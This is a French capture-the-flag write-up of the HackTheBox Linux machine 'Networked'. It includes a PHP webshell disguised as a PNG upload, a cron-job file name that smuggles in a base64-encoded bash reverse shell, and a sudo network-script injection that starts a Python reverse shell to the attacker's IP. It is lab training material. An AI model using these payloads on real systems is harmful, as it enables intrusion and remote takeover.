---
title: HTB | Networked
description: Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.
slug: networked-htb
date: 2025-09-04 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Networked cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Networked</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.146</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.146
PORT    STATE  SERVICE REASON         VERSION
22/tcp  open   ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFgr+LYQ5zL9JWnZmjxP7FT1134sJla89HBT+qnqNvJQRHwO7IqPSa5tEWGZYtzQ2BehsEqb/PisrRHlTeatK0X8qrS3tuz+l1nOj3X/wdcgnFXBrhwpRB2spULt2YqRM49aEbm7bRf2pctxuvgeym/pwCghb6nSbdsaCIsoE+X7QwbG0j6ZfoNIJzQkTQY7O+n1tPP8mlwPOShZJP7+NWVf/kiHsgZqVx6xroCp/NYbQTvLWt6VF/V+iZ3tiT7E1JJxJqQ05wiqsnjnFaZPYP+ptTqorUKP4AenZnf9Wan7VrrzVNZGnFlczj/BsxXOYaRe4Q8VK4PwiDbcwliOBd
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAsf1XXvL55L6U7NrCo3XSBTr+zCnnQ+GorAMgUugr3ihPkA+4Tw2LmpBr1syz7Z6PkNyQw6NzC3KwSUy1BOGw8=
|   256 73cda05b84107da71c7c611df554cfc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMrhnJBfdb0fWQsWVfynAxcQ8+SNlL38vl8VJaaqPTL
80/tcp  open   http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https   reset ttl 63
```

## Foothold

### Website : Port 80
En arrivant sur le site, on trouve le message suivant.
```bash
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse 
```

### dirsearch : /backup.tar, /upload.php
A la racine du site internet, on trouve une archive **backup.tar** contenant les sources du site internet. De plus, on découvre une page nous permettant d'uploader des images et une page pour les observer "photos.php". Un dossier /uploads semble contenir les photos téléchargées.
```bash
dirsearch -u http://10.10.10.146                

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.10.10.146/

[13:59:45] Scanning: 
[13:59:53] 301 -   235B - /backup  ->  http://10.10.10.146/backup/
[13:59:53] 200 -   885B - /backup/
[13:59:53] 403 -   210B - /cgi-bin/
[13:59:55] 200 -   229B - /index.php
[13:59:55] 200 -   229B - /index.php/login/
[13:59:57] 200 -    1KB - /photos.php
[14:00:00] 200 -   169B - /upload.php
[14:00:00] 301 -   236B - /uploads  ->  http://10.10.10.146/uploads/
[14:00:00] 200 -     2B - /uploads/

Task Completed
```

### File Upload : RCE
Après avoir analysé le code source récupéré dans le **backup.tar**, on se rend compte qu'il existe un endoit **/photos.php** permettant d'observer les images uploader sur la page **/upload.php**.

Après quelque tests et analyse du code php, on réussi à uploader un fichier php et a executer du code. Pour cela, j'ai dans un premier temps uploader une veritable image png, puis j'ai changer l'extension en ".php.png". Ensuite, il a fallu supprimer le texte de l'image et le remplacer par du code PHP. Le plus important était de conserver le magic byte "PNG", c'est à dire les premiers octets de l'image permettant de reconnaitre qu'il s'agit bien d'une image PNG.
```bash
POST /upload.php HTTP/1.1
Host: 10.10.10.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------19843469784126652896583145162
Content-Length: 383
Origin: http://10.10.10.146
Connection: keep-alive
Referer: http://10.10.10.146/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------19843469784126652896583145162
Content-Disposition: form-data; name="myFile"; filename="htb-logo.php.png"
Content-Type: image/png

PNG

<?php system($_REQUEST['cmd']); ?>
-----------------------------19843469784126652896583145162
Content-Disposition: form-data; name="submit"

go!
-----------------------------19843469784126652896583145162--
```

Pour obtenir un reverse shell de qualité, j'ai upload ensuite le code "Reverse shell Pentest Monnkey" afin d'obtenir un shell stable :

```bash
$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:56866.
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 14:59:42 up  1:04,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
bash: no job control in this shell
bash-4.2$ whoami
apache
```

## apache -> guly

### Improper sanitization : Command Injection
A la racine de du /home de l'utilisateur **guly**, on trouve un fichier check_attack.php ainsi qu'une crontab montrant que l'utilisateur guly execute ce fichier php toute les 3mns.

On comprend qu'il parcourt le fichier /uploads du site web, si le nom du fichier ne contient pas une IP valide, il execute une commande pour supprimer le fichier.

Cependant, on remarque qu'il utilise la fonction exec() avec /bin/rm, au lieu d'utiliser une fonction php classique permettant la suppression d'un fichier. Cela nous permet de créer un fichier avec des ";" permettant l'execution de n'importe quelle commande Bash !

```bash
bash-4.2$ cat check_attack.php 

<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
```
Voici un exemple de nom de fichier nous permettant d'executer un reverse shell facilement :
```bash
cd /var/www/html/uploads
touch 'a; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzkwMDEgMD4mMQ== | base64 -d | bash; ls'

# Voici la commande
# nohup /bin/rm -f $path$value > /dev/null 2>&1 &

# Voici ce que le programme va reellement executer
nohup /bin/rm -f /var/www/html/uploads/a; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzkwMDEgMD4mMQ== | base64 -d | bash; ls > /dev/null 2>&1 &
```

On obtient bien un shell en tant que **guly** :

```bash
$ nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:47670.
bash: no job control in this shell
[guly@networked ~]$ whoami
whoami
guly
[guly@networked ~]$ python2 -c 'import pty;pty.spawn("/bin/bash")'
python2 -c 'import pty;pty.spawn("/bin/bash")'
[guly@networked ~]$ export TERM=xterm
export TERM=xterm
[guly@networked ~]$ ^Z
[1]  + 4656 suspended  nc -lnvp 9001
 $  stty raw -echo;fg
[1]  + 4656 continued  nc -lnvp 9001

[guly@networked ~]$ 
[guly@networked ~]$ ls
check_attack.php  crontab.guly	k  user.txt
[guly@networked ~]$ cat user.txt 
37e0.....3b8
```

## guly -> root

### Enumeration
```bash
[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

### /usr/local/sbin/changename.sh
Le script nous demande de renseigner plusieurs valeur: NAME, PROXY_METHOD...  
  
Ces valeurs sont mises dans un fichier : `/etc/sysconfig/network-scripts/ifcfg-guly`  
Ensuite, la commande suivante est executé : `/sbin/ifup guly0`  

Ce fichier permet donc de configurer une interface, puis de l'activer "/sbin/ifup INTERFACE".  
  
Après quelques recherches sur internet, et d'après l'indication fournis, il semble qu'une injection de commande soit possible dans le fichier de l'interface. En fait, chaque ligne est executé comme du code Bash.  

Donc lorsqu'on ecrit :
- NAME=VALUE COMMAND ARGS  

**NAME** prend bien la valeur **VALUE**, mais ce qui suit est executé comme une commande, on peut même passer des arguments si necessaire.

Lorsque qu'on allume l'interface, le code Bash malicieux est tout de suite executé.

On remarque pourtant un filtre mais il n'est pas suffisant.
```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=eee
BROWSER_ONLY=eee
BOOTPROTO=eee
```

### Command Injection

On crée un fichier "/tmp/shell" avec un code pour ouvrir un reverse shell. Ici, j'ai choisi d'utiliser un reverse shell python. Mais un code Bash classique pouvait fonctionner aussi.

```bash
[guly@networked ~]$ cat /tmp/shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Ensuite, on execute notre programme avec **sudo**, et on précise une valeur pour la variable suivi du nom de notre programme pour ouvrir le reverse shell :

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
randomtext /tmp/shell
interface PROXY_METHOD:
randomtext
interface BROWSER_ONLY:
randomtext
interface BOOTPROTO:
randomtext

-----------------------------------

nc -lnvp 7777 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:58160.
[root@networked network-scripts]# cat /root/root.txt
cat /root/root.txt
d1ce.....e93
```